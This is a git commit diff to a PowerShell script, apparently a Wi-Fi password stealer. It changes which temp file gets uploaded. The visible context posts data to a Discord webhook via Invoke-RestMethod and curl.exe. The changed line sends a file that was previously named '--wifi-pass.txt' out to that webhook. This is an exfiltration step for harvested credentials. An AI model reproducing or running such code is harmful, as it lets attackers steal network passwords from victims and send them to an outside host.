1316d4350e4c239845d3874d058bc29a8c2949cd
vtrluc <lucnanko@outlook.com>
2024-08-29 17:30:43 +0200

    Add files via upload

--- ssid_1.ps1
+++ ssid_1.ps1
@@ -27,6 +27,6 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/%outputFile%"}
 
 pause
